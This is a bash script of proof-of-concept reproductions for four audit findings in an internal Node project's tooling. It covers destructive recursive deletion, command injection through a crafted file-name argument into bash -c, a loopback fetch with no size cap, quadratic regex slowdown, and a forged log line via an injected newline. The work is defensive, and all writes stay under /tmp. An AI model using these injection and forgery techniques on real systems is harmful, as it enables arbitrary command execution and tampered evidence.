#!/usr/bin/env bash
# K63SentinelScope — reproductions for findings S-1..S-4 (all writes confined to /tmp/kumitate-r63/K63SentinelScope).
set -u
L=/home/vgpnk/Projects/shokunin/kumitate-shokunin
S=/tmp/kumitate-r63/K63SentinelScope
rm -rf "$S"; mkdir -p "$S"; cd "$S"

echo "=== S-1 make-inline-controls.mjs deletes a caller-named tree (rmSync(out, recursive, force)) ==="
mkdir -p rmtest/precious/nested && echo "IMPORTANT USER DATA" > rmtest/precious/nested/keepme.txt && echo sibling > rmtest/precious/sibling.txt
node "$L/.ufo/waves/round-63/probe/make-inline-controls.mjs" "$S/rmtest/precious" >/dev/null 2>&1
echo "keepme.txt exists: $(test -e rmtest/precious/nested/keepme.txt && echo YES || echo NO)"
echo "sibling.txt exists: $(test -e rmtest/precious/sibling.txt && echo YES || echo NO)"

echo "=== S-2 command injection through bash -c in make-topology-controls.mjs:43 / topology63-probe.mjs:53 ==="
rm -f "$S/PWNED"
node "$L/.ufo/waves/round-63/probe/make-topology-controls.mjs" \
  "$S/x\";touch $S/PWNED;\"" b38a2065ab8ac5b198f6569b9013d04411c3d40d "$S/topo-out" >/dev/null 2>&1
echo "PWNED created: $(test -e "$S/PWNED" && echo YES || echo NO)"

echo "=== S-3 T5 live-fetch arm: loopback accepted, no size cap ==="
mkdir -p www && head -c 8388608 /dev/zero | tr '\0' 'A' > www/big.bin
( cd www && python3 -m http.server 18763 --bind 127.0.0.1 >/dev/null 2>&1 ) & SRV=$!; sleep 1
curl -fsSL --max-time 90 --retry 2 -A 'Mozilla/5.0 (kumitate-topology63)' http://127.0.0.1:18763/big.bin -o got.bin
echo "loopback fetch exit=$? bytes=$(stat -c%s got.bin)"
kill $SRV 2>/dev/null
# end-to-end: a lane-written row pointing at loopback makes T5 pass (fixture under $S/ssrf2)
echo "see $S/ssrf2 + 'node .../topology63-probe.mjs $S/ssrf2 <rev> --entry corpus/knowledge/e.md' -> T5 absent from the MISS list"

echo "=== S-3b quadratic normaliser (unclosed <script> tags) ==="
node -e '
const norm=(s)=>s.toString("utf8").replace(/<script[\s\S]*?<\/script>|<style[\s\S]*?<\/style>/gi," ").replace(/<[^>]+>/g," ").replace(/\s+/g," ").trim();
for(const n of [20000,40000,80000]){const b="<script".repeat(n);const t=process.hrtime.bigint();norm(b);
console.log(`bytes=${b.length} norm_ms=${(Number(process.hrtime.bigint()-t)/1e6).toFixed(1)}`);}'

echo "=== S-4 seat-name newline forges an INLINE_DISPATCH: CLEAN line ==="
node "$L/scripts/inline-dispatch-evidence.mjs" --root inject/lane --round 7 --wave w1 \
  --sessions-root inject/sessions --dispatcher-log inject/dispatcher.log
echo "grep CLEAN lines: $(node "$L/scripts/inline-dispatch-evidence.mjs" --root inject/lane --round 7 --wave w1 \
  --sessions-root inject/sessions --dispatcher-log inject/dispatcher.log | grep -c 'INLINE_DISPATCH: CLEAN')"
